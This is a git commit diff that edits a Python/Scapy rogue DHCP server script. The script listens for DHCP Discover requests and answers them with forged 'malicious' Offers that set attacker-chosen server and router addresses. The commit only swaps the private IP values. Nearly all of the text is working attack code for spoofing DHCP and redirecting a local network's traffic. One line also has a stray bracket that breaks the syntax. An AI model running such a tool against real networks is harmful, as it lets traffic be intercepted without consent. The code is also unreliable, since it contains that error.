debe281bcff892c34afc7d1644cc6b3b557f4ed8
isai <juanisaicasadodeoleo@gmail.com>
2026-02-12 19:20:54 -0400

    Update DHCP rogue spoofing IP addresses

--- Dhcp_Rogue_Spoofing.py
+++ Dhcp_Rogue_Spoofing.py
@@ -5,21 +5,22 @@ def dhcp_rogue(pkt):
         print(f"Detectado Discover de {pkt[Ether].src}. Enviando Offer malicioso...")
 
         offer_pkt = Ether(dst=pkt[Ether].src]) / \
-            IP(src="10.15.80.132", dst="255.255.255.255") / \
+            IP(src="10.15.80.3", dst="255.255.255.255") / \
             UDP(sport=67, dport=68) / \
             BOOTP(
                 op=2,
-                yiaddr="10.15.80.200",
-                siaddr="10.15.80.132",
+                yiaddr="10.15.80.20",
+                siaddr="10.15.80.3",
                 chaddr=mac2str(pkt[Ether].src)
             ) / \
             DHCP(options=[
                 ("message-type", "offer"),
-                ("server_id", "10.15.80.132"),
-                ("router", "10.15.80.132"),
+                ("server_id", "10.15.80.3"),
+                ("router", "10.15.80.1"),
                 "end"
             ])
 
         sendp(offer_pkt, iface="eth0", verbose=1)
 
 sniff(filter="udp and (port 67 or 68)", prn=dhcp_rogue, iface="ens3")
+
